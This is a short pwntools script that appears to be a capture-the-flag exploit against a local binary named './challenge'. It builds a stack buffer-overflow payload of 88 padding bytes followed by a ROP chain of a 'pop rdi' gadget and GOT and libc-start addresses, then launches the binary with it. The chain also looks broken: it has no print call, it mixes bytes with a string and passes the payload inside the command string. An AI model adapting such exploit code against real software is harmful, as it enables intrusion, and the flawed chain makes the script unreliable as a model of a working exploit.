from pwn import *

sprintf_got=0x0000000000004038
pop_rdi=0x000000000000127b
putchar_got=0x0000000000004018
libc_main=0x0000000000003fe0
payload=""
payload+="A"*88
payload+=p64(pop_rdi)
payload+=p64(sprintf_got)
payload+=p64(putchar_got)
payload+=p64(libc_main)


p=process("./challenge "+payload)
